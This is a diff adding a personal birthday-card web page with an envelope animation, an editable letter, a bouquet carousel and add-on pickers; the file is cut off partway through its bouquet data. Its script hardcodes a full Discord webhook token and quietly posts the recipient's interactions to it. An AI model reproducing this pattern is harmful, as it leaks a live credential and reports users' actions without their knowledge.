@@ -1,0 +1,1683 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Happy Birthday Ashie • 27 Dec</title>
+
+  <!-- Google Fonts: Fredoka & Quicksand -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            blush: '#ffeef2',
+            cream: '#fff8f9',
+            rosegold: '#e09f9d',
+            rosegolddark: '#c57b79',
+            strawberry: '#ff8fa3',
+            gold: '#f4c95d',
+            choco: '#5c4033',
+            chocolight: '#8d6e63',
+          },
+          fontFamily: {
+            cute: ['Fredoka', 'Quicksand', 'cursive', 'sans-serif'],
+            body: ['Quicksand', 'sans-serif'],
+          },
+          boxShadow: {
+            soft: '0 16px 40px -10px rgba(224, 159, 157, 0.30)',
+            pill: '0 8px 22px -4px rgba(255, 143, 163, 0.48)',
+          },
+        },
+      },
+    };
+  </script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Quicksand', sans-serif;
+      color: #5c4033;
+      background-color: #fff8f9;
+      background-image:
+        radial-gradient(#f8c8dc 1.5px, transparent 1.5px),
+        radial-gradient(#f4c95d 1.1px, #ffeef2 1.1px);
+      background-size: 38px 38px;
+      background-position: 0 0, 19px 19px;
+      overflow-x: hidden;
+    }
+
+    .font-cute {
+      font-family: 'Fredoka', 'Quicksand', cursive, sans-serif;
+    }
+
+    /* Envelope Flap Animation */
+    .envelope-flap {
+      transform-origin: top center;
+      transition: transform 0.65s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .envelope-opened .envelope-flap {
+      transform: rotateX(180deg);
+    }
+
+    @keyframes sealPulse {
+      0%, 100% {
+        transform: scale(1);
+        box-shadow: 0 0 0 0 rgba(255, 143, 163, 0.55);
+      }
+      50% {
+        transform: scale(1.06);
+        box-shadow: 0 0 0 14px rgba(255, 143, 163, 0);
+      }
+    }
+
+    .wax-seal {
+      animation: sealPulse 2.3s infinite ease-in-out;
+    }
+
+    @keyframes floatAmbient {
+      0% {
+        transform: translateY(105vh) rotate(0deg);
+        opacity: 0;
+      }
+      15% {
+        opacity: 0.7;
+      }
+      85% {
+        opacity: 0.6;
+      }
+      100% {
+        transform: translateY(-12vh) rotate(360deg);
+        opacity: 0;
+      }
+    }
+
+    .ambient-petal {
+      position: fixed;
+      pointer-events: none;
+      z-index: 1;
+      animation: floatAmbient linear infinite;
+    }
+
+    @keyframes popIn {
+      0% {
+        opacity: 0;
+        transform: translateY(12px) scale(0.97);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .animate-pop-in {
+      animation: popIn 0.35s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+    }
+
+    .fade-screen {
+      transition: opacity 0.45s ease, transform 0.45s ease;
+    }
+  </style>
+</head>
+<body class="min-h-screen relative selection:bg-strawberry/30 selection:text-choco">
+
+  <!-- Non-blocking Confetti Canvas -->
+  <canvas id="confettiCanvas" class="fixed inset-0 w-full h-full pointer-events-none z-40"></canvas>
+
+  <!-- Non-blocking Ambient Petals & Sparkles -->
+  <div id="ambientLayer" aria-hidden="true" class="fixed inset-0 pointer-events-none overflow-hidden z-0"></div>
+
+  <!-- Non-blocking Toast Banner -->
+  <div id="toastBanner" class="fixed top-5 left-1/2 -translate-x-1/2 z-50 pointer-events-none opacity-0 transition-all duration-300 transform -translate-y-3">
+    <div id="toastText" class="bg-choco text-cream text-xs sm:text-sm font-cute font-semibold px-5 py-2.5 rounded-full shadow-lg border border-gold/50 text-center max-w-[90vw]">
+      Notification
+    </div>
+  </div>
+
+  <!-- =====================================================================
+       SCREEN 1: SINGLE OPENING ENVELOPE SCREEN (ULTRA-RELIABLE CLICK)
+       ===================================================================== -->
+  <section id="envelopeScreen" class="fade-screen relative z-30 min-h-screen flex flex-col items-center justify-center px-4 py-8">
+    <!-- Top Date Pill -->
+    <div class="mb-5 inline-flex items-center gap-2 bg-white/95 border border-rosegold/45 px-4 py-1.5 rounded-full shadow-sm">
+      <span class="text-base">💐</span>
+      <span class="font-cute font-semibold text-xs sm:text-sm text-choco">
+        Special Birthday Gift For You • <span class="text-strawberry">27 Dec</span>
+      </span>
+    </div>
+
+    <!-- Envelope Card -->
+    <div id="envelopeBox" class="relative w-full max-w-md bg-gradient-to-b from-[#fff6f8] to-[#ffeaf0] rounded-3xl border-2 border-rosegold/55 shadow-soft overflow-hidden pt-20 pb-8 px-6 sm:px-8 text-center">
+      <!-- Decorative Flap (Strictly pointer-events-none) -->
+      <div class="envelope-flap pointer-events-none absolute top-0 left-0 right-0 h-28 bg-gradient-to-b from-[#ffd6e2] to-[#ffc2d4] border-b-2 border-dashed border-gold/75" style="clip-path: polygon(0 0, 100% 0, 50% 88%);"></div>
+
+      <!-- Envelope Top Badges -->
+      <div class="relative z-10 flex items-center justify-between mb-5 -mt-8 pointer-events-none">
+        <span class="inline-flex items-center gap-1.5 bg-white/95 border border-rosegold/40 px-3 py-1 rounded-full text-xs font-cute font-semibold text-choco shadow-sm">
+          <span>💌</span> Birthday Mail
+        </span>
+        <span class="inline-block bg-white/95 border border-dashed border-rosegold px-3 py-1 rounded-xl text-[11px] font-cute font-semibold text-strawberry shadow-sm leading-tight">
+          <span class="block text-[9px] text-chocolight tracking-wider">DATE</span>
+          27 Dec
+        </span>
+      </div>
+
+      <!-- Inner Address Plate -->
+      <div class="relative z-10 bg-white/95 rounded-2xl border border-rosegold/35 px-5 py-6 mb-7 shadow-sm pointer-events-none">
+        <p class="font-cute font-semibold text-[11px] tracking-[0.2em] uppercase text-rosegolddark mb-1">
+          A SWEET SURPRISE FOR
+        </p>
+        <h1 class="font-cute font-bold text-3xl sm:text-4xl text-choco mb-1.5">
+          Ashie
+        </h1>
+        <p class="text-sm text-chocolight font-medium">
+          For someone extra special on your birthday 🌸
+        </p>
+        <div class="w-16 h-px bg-rosegold/35 mx-auto my-3"></div>
+        <p class="text-xs sm:text-sm font-cute font-medium text-chocolight">
+          Sent with love from <span class="text-strawberry font-semibold">Kon</span>
+        </p>
+      </div>
+
+      <!-- Interactive Heart Seal & Open Button (Highest z-50 & pointer-events-auto) -->
+      <div class="relative z-50 flex flex-col items-center pointer-events-auto">
+        <button
+          id="openEnvelopeBtn"
+          type="button"
+          onclick="window.__openBirthdayCard && window.__openBirthdayCard(event)"
+          aria-label="Open Birthday Card"
+          class="wax-seal group relative z-50 w-20 h-20 rounded-full bg-gradient-to-br from-[#ff8fa3] via-[#e09f9d] to-[#c57b79] border-4 border-gold/90 flex items-center justify-center text-white cursor-pointer pointer-events-auto focus:outline-none focus:ring-4 focus:ring-gold/50 transition-transform active:scale-95"
+        >
+          <span class="pointer-events-none absolute inset-1.5 rounded-full border border-white/45"></span>
+          <svg class="pointer-events-none w-9 h-9 text-cream drop-shadow-sm group-hover:scale-110 transition-transform" viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
+          </svg>
+        </button>
+
+        <button
+          id="openEnvelopeTextBtn"
+          type="button"
+          onclick="window.__openBirthdayCard && window.__openBirthdayCard(event)"
+          class="relative z-50 mt-5 inline-flex items-center gap-2 bg-gradient-to-r from-strawberry to-rosegolddark hover:from-rosegolddark hover:to-strawberry text-white font-cute font-semibold text-base sm:text-lg px-7 py-3.5 rounded-full shadow-pill transition-all duration-300 hover:-translate-y-0.5 active:translate-y-0 cursor-pointer pointer-events-auto"
+        >
+          <span class="pointer-events-none">Open Birthday Card ✨</span>
+        </button>
+        <p class="pointer-events-none mt-2.5 text-xs text-chocolight/85">
+          Tap the heart seal or button above to open your card
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- =====================================================================
+       SCREEN 2: MAIN BIRTHDAY WISH & BOUQUET + ADD-ON BUILDER
+       ===================================================================== -->
+  <main id="mainExperience" class="fade-screen hidden opacity-0 relative z-20 max-w-2xl mx-auto px-4 py-8 sm:py-12">
+
+    <!-- Top Header Pill -->
+    <div class="text-center mb-6">
+      <span class="inline-flex items-center gap-2 bg-white/95 border border-rosegold/45 px-4 py-1.5 rounded-full text-xs sm:text-sm font-cute font-semibold text-choco shadow-sm">
+        <span>🎂</span> 27 December • Happy Birthday, <span id="headerRecipientName" class="text-strawberry">Ashie</span>
+      </span>
+    </div>
+
+    <!-- 1. VINTAGE GOLD-BORDERED STATIONERY WISH CARD -->
+    <section
+      style="background: linear-gradient(180deg, #fffdf9 0%, #fff6f8 100%);"
+      class="max-w-2xl mx-auto rounded-3xl border-2 border-rosegold/50 shadow-soft p-3 sm:p-4 mb-8 relative overflow-hidden"
+    >
+      <!-- Gold-accented double inner stationery border -->
+      <div class="relative rounded-2xl border border-gold/65 p-6 sm:p-9 text-center">
+        <!-- Corner Flourishes -->
+        <span aria-hidden="true" class="pointer-events-none absolute top-3 left-3.5 text-sm sm:text-base opacity-80">🌸</span>
+        <span aria-hidden="true" class="pointer-events-none absolute top-3 right-3.5 text-sm sm:text-base opacity-80">✨</span>
+        <span aria-hidden="true" class="pointer-events-none absolute bottom-3 left-3.5 text-sm sm:text-base opacity-80">🌷</span>
+
+        <!-- Subtle Edit Wish Button -->
+        <button
+          id="toggleEditWishBtn"
+          type="button"
+          class="absolute bottom-3 right-3 z-10 inline-flex items-center gap-1 text-[11px] font-cute font-semibold text-chocolight/85 hover:text-strawberry bg-blush/80 hover:bg-blush px-3 py-1 rounded-full border border-rosegold/35 transition cursor-pointer"
+        >
+          <span>Edit Wish ✏️</span>
+        </button>
+
+        <!-- Display Mode -->
+        <div id="wishDisplayMode">
+          <div class="inline-flex items-center gap-1.5 bg-blush border border-rosegold/40 px-4 py-1 rounded-full mb-4 shadow-2xs">
+            <span class="text-xs">💌</span>
+            <span class="font-cute font-semibold text-[11px] text-rosegolddark uppercase tracking-[0.16em]">
+              A BIRTHDAY LETTER FOR <span id="letterBadgeRecipient">ASHIE</span>
+            </span>
+          </div>
+
+          <h2 class="font-cute font-bold text-2xl sm:text-4xl text-choco mb-3 tracking-tight">
+            Happy Birthday, <span id="displayRecipient" class="text-strawberry">Ashie</span>! 🌸
+          </h2>
+
+          <div class="w-16 h-0.5 bg-gradient-to-r from-transparent via-gold to-transparent mx-auto mb-4"></div>
+
+          <p id="displayMessage" class="max-w-lg mx-auto text-sm sm:text-base text-choco/90 font-medium leading-relaxed whitespace-pre-line mb-5">
+            Wishing the happiest birthday to the sweetest person in my world. Even from afar, I want today to feel extra warm, gentle, and full of smiles for you. Pick your favorite bouquet and a little birthday treat below—made just for you!
+          </p>
+
+          <p class="font-cute font-semibold text-sm sm:text-base text-rosegolddark">
+            — Always yours, <span id="displaySender" class="text-strawberry">Kon</span> 💕
+          </p>
+        </div>
+
+        <!-- Edit Mode -->
+        <div id="wishEditMode" class="hidden text-left space-y-3 bg-blush/65 p-4 rounded-2xl border border-rosegold/35">
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+            <div>
+              <label class="block text-xs font-cute font-semibold text-chocolight mb-1">To (Recipient)</label>
+              <input id="editRecipientInput" type="text" value="Ashie" class="w-full px-3.5 py-2 rounded-xl bg-white border border-rosegold/45 text-sm text-choco focus:outline-none focus:border-strawberry" />
+            </div>
+            <div>
+              <label class="block text-xs font-cute font-semibold text-chocolight mb-1">From (Sender)</label>
+              <input id="editSenderInput" type="text" value="Kon" class="w-full px-3.5 py-2 rounded-xl bg-white border border-rosegold/45 text-sm text-choco focus:outline-none focus:border-strawberry" />
+            </div>
+          </div>
+          <div>
+            <label class="block text-xs font-cute font-semibold text-chocolight mb-1">Birthday Message</label>
+            <textarea id="editMessageInput" rows="3" class="w-full px-3.5 py-2 rounded-xl bg-white border border-rosegold/45 text-sm text-choco focus:outline-none focus:border-strawberry">Wishing the happiest birthday to the sweetest person in my world. Even from afar, I want today to feel extra warm, gentle, and full of smiles for you. Pick your favorite bouquet and a little birthday treat below—made just for you!</textarea>
+          </div>
+          <div class="flex justify-end gap-2">
+            <button id="cancelEditWishBtn" type="button" class="px-4 py-1.5 rounded-full text-xs font-cute font-semibold text-chocolight hover:bg-white transition cursor-pointer">
+              Cancel
+            </button>
+            <button id="saveEditWishBtn" type="button" class="px-5 py-1.5 rounded-full text-xs font-cute font-semibold bg-strawberry text-white shadow-sm hover:bg-rosegolddark transition cursor-pointer">
+              Save Note ✨
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 2. BOUQUET CAROUSEL SECTION (3 MAIN + 2 SECRET, ZERO SIZE LABELS) -->
+    <section class="bg-white/95 rounded-3xl border-2 border-rosegold/45 shadow-soft p-6 sm:p-8 mb-8">
+      <div class="text-center mb-5">
+        <span class="inline-block bg-blush border border-rosegold/35 px-3.5 py-1 rounded-full text-xs font-cute font-semibold text-rosegolddark mb-2">
+          Step 1 • Pick Your Flowers
+        </span>
+        <h3 class="font-cute font-bold text-2xl sm:text-3xl text-choco">
+          Choose Your Birthday Bouquet 💐
+        </h3>
+        <p class="text-xs sm:text-sm text-chocolight mt-1">
+          Tap the arrows or color dots to browse each bouquet
+        </p>
+      </div>
+
+      <!-- Carousel Stage -->
+      <div class="relative bg-blush/55 rounded-2xl border border-rosegold/35 p-4 sm:p-6">
+        <!-- Left Arrow -->
+        <button
+          id="prevBouquetBtn"
+          type="button"
+          aria-label="Previous Bouquet"
+          class="absolute left-2 sm:left-3 top-1/2 -translate-y-1/2 z-20 w-10 h-10 sm:w-11 sm:h-11 rounded-full bg-white/95 hover:bg-white border border-rosegold/45 shadow-md flex items-center justify-center text-choco hover:text-strawberry transition active:scale-90 cursor-pointer"
+        >
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
+          </svg>
+        </button>
+
+        <!-- Right Arrow -->
+        <button
+          id="nextBouquetBtn"
+          type="button"
+          aria-label="Next Bouquet"
+          class="absolute right-2 sm:right-3 top-1/2 -translate-y-1/2 z-20 w-10 h-10 sm:w-11 sm:h-11 rounded-full bg-white/95 hover:bg-white border border-rosegold/45 shadow-md flex items-center justify-center text-choco hover:text-strawberry transition active:scale-90 cursor-pointer"
+        >
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+          </svg>
+        </button>
+
+        <!-- Active Bouquet Display -->
+        <div id="activeBouquetCard" class="max-w-md mx-auto text-center px-6 sm:px-8">
+          <div id="activeBouquetVisual" class="relative w-full aspect-[4/3] max-h-[320px] rounded-2xl bg-gradient-to-br from-[#ffe5ec] to-[#fff5f8] border-2 border-dashed border-rosegold/60 flex flex-col items-center justify-center p-4 mb-4 overflow-hidden shadow-inner">
+            <!-- Populated via JS -->
+          </div>
+
+          <div class="inline-flex items-center gap-2 mb-1.5">
+            <span id="activeBouquetTag" class="px-3 py-0.5 rounded-full text-xs font-cute font-semibold bg-white border border-rosegold/40 text-rosegolddark">
+              Pink Tulips
+            </span>
+            <span id="activeBouquetCounter" class="text-xs font-cute font-semibold text-chocolight">
+              1 / 3
+            </span>
+          </div>
+          <h4 id="activeBouquetName" class="font-cute font-bold text-2xl text-choco mb-1">
+            Brooklyn
+          </h4>
+          <p id="activeBouquetDesc" class="text-xs sm:text-sm text-chocolight leading-relaxed">
+            Soft blush pink tulips wrapped in delicate pastel paper with a satin ribbon.
+          </p>
+        </div>
+
+        <!-- Color Dot Indicators -->
+        <div id="bouquetDots" class="flex flex-wrap items-center justify-center gap-2 mt-5">
+          <!-- Populated via JS -->
+        </div>
+      </div>
+
+      <!-- Secret Unlock Card (Appears when viewing the 3rd bouquet 'Isabelle') -->
+      <div id="secretUnlockBanner" class="hidden mt-5 bg-gradient-to-r from-[#fff0f5] via-[#ffe5ec] to-[#fff0f5] rounded-2xl border-2 border-gold/75 p-4 sm:p-5 text-center shadow-sm animate-pop-in">
+        <p class="font-cute font-bold text-base sm:text-lg text-choco mb-1">
+          Not quite the one yet? 👀
+        </p>
+        <p class="text-xs sm:text-sm text-chocolight mb-3.5">
+          I saved two more special bouquets just in case you want to take a peek!
+        </p>
+        <button
+          id="unlockExtraBouquetsBtn"
+          type="button"
+          class="inline-flex items-center gap-2 bg-gradient-to-r from-gold to-[#f2b84b] hover:brightness-105 text-choco font-cute font-semibold text-xs sm:text-sm px-5 py-2.5 rounded-full shadow-sm transition transform hover:-translate-y-0.5 cursor-pointer"
+        >
+          <span>See 2 more special bouquets ✨</span>
+        </button>
+      </div>
+    </section>
+
+    <!-- 3. CATEGORY-FIRST ADD-ON SELECTION SECTION -->
+    <section class="bg-white/95 rounded-3xl border-2 border-rosegold/45 shadow-soft p-6 sm:p-8 mb-8">
+      <div class="text-center mb-5">
+        <span class="inline-block bg-blush border border-rosegold/35 px-3.5 py-1 rounded-full text-xs font-cute font-semibold text-rosegolddark mb-2">
+          Step 2 • Sweet Little Extras
+        </span>
+        <h3 class="font-cute font-bold text-2xl sm:text-3xl text-choco mb-3">
+          Pick Your Birthday Add-ons 🎁
+        </h3>
+
+        <!-- Clean Allowance Pill (No mention of bouquet sizes) -->
+        <div class="inline-flex items-center gap-2 bg-blush border border-rosegold/50 px-4 py-1.5 rounded-full shadow-sm">
+          <span id="addonAllowanceText" class="font-cute font-semibold text-xs sm:text-sm text-choco">
+            You can choose 1 special add-on 💕
+          </span>
+        </div>
+      </div>
+
+      <!-- Category Checkboxes (Tick First) -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3.5 mb-5">
+        <!-- Plushie Category Toggle -->
+        <label
+          id="catCardPlushie"
+          class="flex items-center justify-between p-4 rounded-2xl border-2 border-rosegold/40 bg-blush/45 hover:bg-blush/85 cursor-pointer transition select-none"
+        >
+          <div class="flex items-center gap-3">
+            <span class="text-2xl">🧸</span>
+            <div>
+              <span class="block font-cute font-semibold text-base text-choco">Plushie</span>
+              <span class="block text-xs text-chocolight">3 cuddly friends to pick from</span>
+            </div>
+          </div>
+          <input
+            id="checkPlushie"
+            type="checkbox"
+            class="w-5 h-5 accent-[#ff8fa3] rounded cursor-pointer"
+          />
+        </label>
+
+        <!-- Bracelet Category Toggle -->
+        <label
+          id="catCardBracelet"
+          class="flex items-center justify-between p-4 rounded-2xl border-2 border-rosegold/40 bg-blush/45 hover:bg-blush/85 cursor-pointer transition select-none"
+        >
+          <div class="flex items-center gap-3">
+            <span class="text-2xl">✨</span>
+            <div>
+              <span class="block font-cute font-semibold text-base text-choco">Bracelet</span>
+              <span class="block text-xs text-chocolight">3 dainty daisy designs</span>
+            </div>
+          </div>
+          <input
+            id="checkBracelet"
+            type="checkbox"
+            class="w-5 h-5 accent-[#ff8fa3] rounded cursor-pointer"
+          />
+        </label>
+      </div>
+
+      <!-- Expanded Sub-Options Container -->
+      <div id="addonSubOptionsContainer" class="space-y-6">
+        <!-- Plushie 3-Item Picker -->
+        <div id="plushiePickerPanel" class="hidden animate-pop-in bg-blush/45 rounded-2xl border border-rosegold/35 p-4">
+          <p class="font-cute font-semibold text-sm text-choco mb-3 flex items-center gap-1.5">
+            <span>🧸</span> Choose your favorite Plushie:
+          </p>
+          <div id="plushieGrid" class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+            <!-- Populated via JS -->
+          </div>
+        </div>
+
+        <!-- Bracelet 3-Item Picker -->
+        <div id="braceletPickerPanel" class="hidden animate-pop-in bg-blush/45 rounded-2xl border border-rosegold/35 p-4">
+          <p class="font-cute font-semibold text-sm text-choco mb-3 flex items-center gap-1.5">
+            <span>✨</span> Choose your favorite Bracelet:
+          </p>
+          <div id="braceletGrid" class="grid grid-cols-1 sm:grid-cols-3 gap-3">
+            <!-- Populated via JS -->
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CONFIRM BUTTON -->
+    <div class="text-center pb-6">
+      <button
+        id="confirmChoicesBtn"
+        type="button"
+        class="inline-flex items-center justify-center gap-2.5 bg-gradient-to-r from-strawberry to-rosegolddark hover:from-rosegolddark hover:to-strawberry text-white font-cute font-semibold text-base sm:text-lg px-8 py-4 rounded-full shadow-pill transition-all duration-300 hover:-translate-y-0.5 active:translate-y-0 cursor-pointer"
+      >
+        <span>Confirm Choices & View Summary ✨</span>
+      </button>
+    </div>
+  </main>
+
+  <!-- =====================================================================
+       SCREEN 3: MINIMALIST FINAL SUMMARY SCREEN (SINGLE SAVE IMAGE BUTTON)
+       ===================================================================== -->
+  <section id="summaryScreen" class="fade-screen hidden opacity-0 relative z-20 min-h-screen flex flex-col items-center justify-center px-4 py-10">
+    <div class="w-full max-w-lg bg-white/95 rounded-3xl border-2 border-rosegold/55 shadow-soft p-6 sm:p-8 text-center relative">
+      <!-- Subtle Back/Edit Link -->
+      <button
+        id="backToEditChoicesBtn"
+        type="button"
+        class="absolute top-4 left-4 text-xs font-cute font-semibold text-chocolight/75 hover:text-strawberry transition cursor-pointer"
+      >
+        ← Edit
+      </button>
+
+      <!-- Summary Header -->
+      <div class="mb-5 pt-2">
+        <span class="inline-block bg-blush border border-rosegold/40 px-3.5 py-1 rounded-full text-xs font-cute font-semibold text-rosegolddark mb-2">
+          27 Dec • From <span id="summarySenderTop">Kon</span>
+        </span>
+        <h2 class="font-cute font-bold text-2xl sm:text-3xl text-choco">
+          Happy Birthday, <span id="summaryRecipientTop" class="text-strawberry">Ashie</span>! 🎂
+        </h2>
+      </div>
+
+      <!-- Chosen Bouquet & Add-on Visual Cards -->
+      <div id="summaryItemsGrid" class="grid grid-cols-1 sm:grid-cols-2 gap-3.5 mb-5">
+        <!-- Populated dynamically via JS -->
+      </div>
+
+      <!-- Short Birthday Wish Message -->
+      <div class="bg-blush/65 rounded-2xl border border-rosegold/35 px-5 py-4 mb-6">
+        <p id="summaryWishNote" class="text-xs sm:text-sm text-choco/90 italic leading-relaxed">
+          "Happy Birthday, Ashie! May your day bloom as brightly as these flowers. Sending all my love across the miles — Kon 💕"
+        </p>
+      </div>
+
+      <!-- Single Primary Action Button -->
+      <button
+        id="saveSummaryImageBtn"
+        type="button"
+        class="w-full sm:w-auto inline-flex items-center justify-center gap-2 bg-gradient-to-r from-strawberry to-rosegolddark hover:from-rosegolddark hover:to-strawberry text-white font-cute font-semibold text-base sm:text-lg px-9 py-3.5 rounded-full shadow-pill transition-all duration-300 hover:-translate-y-0.5 active:translate-y-0 cursor-pointer"
+      >
+        <span>Save Image 📸</span>
+      </button>
+    </div>
+  </section>
+
+  <!-- Hidden Offscreen Canvas for High-Res PNG Export -->
+  <canvas id="exportCanvas" width="1080" height="1350" class="hidden"></canvas>
+
+  <!-- =====================================================================
+       APPLICATION JAVASCRIPT (CLEAN, COMPLETE, RESILIENT)
+       ===================================================================== -->
+  <script>
+    (function () {
+      'use strict';
+
+      // Discord Webhook URL (Silent Background Notifications)
+      const DISCORD_WEBHOOK_URL =
+        'https://discord.com/api/webhooks/1572975931155288196/Eo56K5S-ZOJlgw6Iv4f8DMEFRqQDriQpbxWzA72qPK-QMk_jQopD_SYQi__DC86eZIDO';
+
+      function sendToDiscord(title, description, colorCode = 16748698) {
+        if (!DISCORD_WEBHOOK_URL) return;
+        try {
+          fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              username: 'Birthday Surprise Bot 💌',
+              embeds: [
+                {
+                  title: title,
+                  description: description,
+                  color: colorCode,
+                  timestamp: new Date().toISOString(),
+                },
+              ],
+            }),
+          }).catch(() => {});
+        } catch (err) {
+          // Silently ignore any sandbox/network errors
+        }
+      }
+
+      // -------------------------------------------------------------------
+      // 1. DATA DEFINITIONS (WITH photoUrl SLOTS READY FOR REAL PHOTOS)
+      // -------------------------------------------------------------------
+      const BOUQUETS = [
+        {
+          id: 'brooklyn',
+          name: 'Brooklyn',
+          maxAddons: 1,
+          colorTag: 'Pink Tulips',
+          dotColor: '#ff8fa3',
+          isSecret: false,
+          photoUrl: '', // Paste real Brooklyn bouquet photo URL here
+          bgGradient: 'from-[#ffe5ec] to-[#fff5f8]',
+          description: 'Soft blush pink tulips wrapped in delicate pastel silk paper with a white satin bow.',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="180" height="180" viewBox="0 0 180 180" class="w-40 h-40 mx-auto drop-shadow-sm" fill="none">
+            <path d="M40 52 L90 155 L140 52 L90 36 Z" fill="#F8C8DC" stroke="#E09F9D" stroke-width="2.5"/>
+            <path d="M54 58 L90 145 L126 58 Z" fill="#FFF5F8"/>
+            <path d="M74 118 Q90 124 106 118 L100 162 L80 162 Z" fill="#F4ACB7"/>
+            <path d="M90 120 L74 148 M90 120 L106 148" stroke="#FFFFFF" stroke-width="4" stroke-linecap="round"/>
+            <circle cx="90" cy="120" r="5" fill="#FFFFFF"/>
+            <path d="M72 68 Q72 46 80 46 Q88 46 88 68 Z" fill="#FF758F"/>
+            <path d="M92 64 Q92 42 100 42 Q108 42 108 64 Z" fill="#FF8FA3"/>
+            <path d="M82 76 Q82 54 90 54 Q98 54 98 76 Z" fill="#FFB3C1"/>
+          </svg>`,
+        },
+        {
+          id: 'penelope',
+          name: 'Penelope',
+          maxAddons: 1,
+          colorTag: 'Purple Tulips',
+          dotColor: '#b57edc',
+          isSecret: false,
+          photoUrl: '', // Paste real Penelope bouquet photo URL here
+          bgGradient: 'from-[#f3e8ff] to-[#faf5ff]',
+          description: 'Dreamy lavender and violet tulips nestled in pastel lilac wrapping with lace ribbon.',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="180" height="180" viewBox="0 0 180 180" class="w-40 h-40 mx-auto drop-shadow-sm" fill="none">
+            <path d="M40 52 L90 155 L140 52 L90 36 Z" fill="#E0C3FC" stroke="#B57EDC" stroke-width="2.5"/>
+            <path d="M54 58 L90 145 L126 58 Z" fill="#FAF5FF"/>
+            <path d="M74 118 Q90 124 106 118 L100 162 L80 162 Z" fill="#CDB4DB"/>
+            <path d="M90 120 L74 148 M90 120 L106 148" stroke="#FFFFFF" stroke-width="4" stroke-linecap="round"/>
+            <circle cx="90" cy="120" r="5" fill="#FFFFFF"/>
+            <path d="M72 68 Q72 46 80 46 Q88 46 88 68 Z" fill="#9D4EDD"/>
+            <path d="M92 64 Q92 42 100 42 Q108 42 108 64 Z" fill="#B57EDC"/>
+            <path d="M82 76 Q82 54 90 54 Q98 54 98 76 Z" fill="#C77DFF"/>
+          </svg>`,
+        },
+        {
+          id: 'isabelle',
+          name: 'Isabelle',
+          maxAddons: 1,
+          colorTag: 'Yellow Tulips',
+          dotColor: '#f4c95d',
+          isSecret: false,
+          photoUrl: '', // Paste real Isabelle bouquet photo URL here
+          bgGradient: 'from-[#fff8e1] to-[#fffdf5]',
+          description: 'Sunny golden-yellow tulips wrapped in warm ivory cream paper with a white satin bow.',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="180" height="180" viewBox="0 0 180 180" class="w-40 h-40 mx-auto drop-shadow-sm" fill="none">
+            <path d="M40 52 L90 155 L140 52 L90 36 Z" fill="#FFF1C1" stroke="#E5A93B" stroke-width="2.5"/>
+            <path d="M54 58 L90 145 L126 58 Z" fill="#FFFDF7"/>
+            <path d="M74 118 Q90 124 106 118 L100 162 L80 162 Z" fill="#FFE599"/>
+            <path d="M90 120 L74 148 M90 120 L106 148" stroke="#FFFFFF" stroke-width="4" stroke-linecap="round"/>
+            <circle cx="90" cy="120" r="5" fill="#FFFFFF"/>
+            <path d="M72 68 Q72 46 80 46 Q88 46 88 68 Z" fill="#FFB703"/>
+            <path d="M92 64 Q92 42 100 42 Q108 42 108 64 Z" fill="#FFD166"/>
+            <path d="M82 76 Q82 54 90 54 Q98 54 98 76 Z" fill="#F4A261"/>
+          </svg>`,
+        },
+        {
+          id: 'meliora',
+          name: 'Meliora',
+          maxAddons: 2,
+          colorTag: 'Sunflower & Orange Tulips',
+          dotColor: '#fb8500',
+          isSecret: true,
+          photoUrl: '', // Paste real Meliora bouquet photo URL here
+          bgGradient: 'from-[#fff3cd] to-[#ffe8d6]',
+          description: 'Radiant golden sunflower paired with warm coral-orange tulips in honey-cream wrap.',
+          svgArt: `<svg xmlns="http://www.w3.org/2000/svg" width="180" height="180" viewBox="0 0 180 180" class="w-40 h-40 mx-auto drop-shadow-sm" fill="none">
+            <path d="M40 52 L90 155 L140 52 L90 36 Z" fill="#F7D9A8" stroke="#D4A373" stroke-width="2.5"/>
+            <path d="M74 118 Q90 124 106 118 L100 162 L80 162 Z" fill="#E6CCB2"/>
+            <path d="M90 120 L74 148 M90 120 L106 148" stroke="#FFFFFF" stroke-width="4" stroke-linecap="round"/>
+            <circle cx="84" cy="70" r="20" fill="#FFB703"/>
+            <circle cx="84" cy="70" r="10" fill="#5C3D2E"/>
+            <path d="M102 62 Q102 44 109 44 Q116 44 116 62 Z" fill="#FB8500"/>
+          </svg>`,
+        },
+        {
+          id: 'tender-moments',
+          name: 'Tender Moments',
+          maxAddons: 2,
+          colorTag: 'Red Wrap Bouquet',
